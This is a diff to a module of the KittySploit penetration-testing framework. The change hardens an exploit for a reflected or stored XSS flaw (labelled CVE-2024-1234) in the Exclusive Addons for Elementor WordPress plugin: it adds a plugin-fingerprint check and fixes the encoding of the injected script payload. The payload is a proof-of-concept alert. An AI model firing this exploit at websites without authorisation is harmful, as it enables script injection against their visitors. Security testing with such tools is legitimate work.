@@ -3,7 +3,7 @@
 
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
-from urllib.parse import urlencode
+from urllib.parse import quote_plus
 
 class Module(Auxiliary, Http_client):
     
@@ -28,16 +28,37 @@ class Module(Auxiliary, Http_client):
     
     # XSS payload options
     xss_payload = OptString("<script>alert('XSS-KittySploit')</script>", "XSS payload to inject", required=False)
+
+    def _has_exclusive_addons_fingerprint(self):
+        try:
+            response = self.http_request(
+                method="GET",
+                path="/",
+                timeout=10
+            )
+            if not response or response.status_code != 200:
+                return False
+            body = (response.text or "").lower()
+            return (
+                "/wp-content/plugins/exclusive-addons-for-elementor/" in body
+                or "exclusive addons for elementor" in body
+            )
+        except Exception:
+            return False
     
     def check(self):
         """Check if target is vulnerable"""
         try:
             
             print_info(f"Checking {self.rhost}:{self.rport} for CVE-2024-1234...")
+
+            if not self._has_exclusive_addons_fingerprint():
+                print_warning("Exclusive Addons plugin fingerprint not found")
+                return False
             
             # Use a test payload to check if the parameter is vulnerable
             test_payload = "<script>alert('XSS-TEST')</script>"
-            test_url = f"?s={urlencode(test_payload)}"
+            test_url = f"/?s={quote_plus(test_payload)}"
 
             try:
                 response = self.http_request(
@@ -80,9 +101,13 @@ class Module(Auxiliary, Http_client):
             print_info(f"Target: {self.rhost}:{self.rport}")
             print_warning("CVE-2024-1234: Stored XSS in Exclusive Addons for Elementor plugin")
             print_info(f"Payload: {self.xss_payload}")
+
+            if not self._has_exclusive_addons_fingerprint():
+                print_error("Exclusive Addons plugin fingerprint not found")
+                return False
             
             # Construct the exploit URL with the XSS payload
-            exploit_path = f"?s={urlencode(self.xss_payload)}"
+            exploit_path = f"/?s={quote_plus(self.xss_payload)}"
             
             print_info(f"Sending exploit to: {self.rhost}:{self.rport}{exploit_path}")
             
@@ -138,4 +163,3 @@ class Module(Auxiliary, Http_client):
                 
         except Exception as e:
             print_error(f"Exploitation failed: {e}")
-
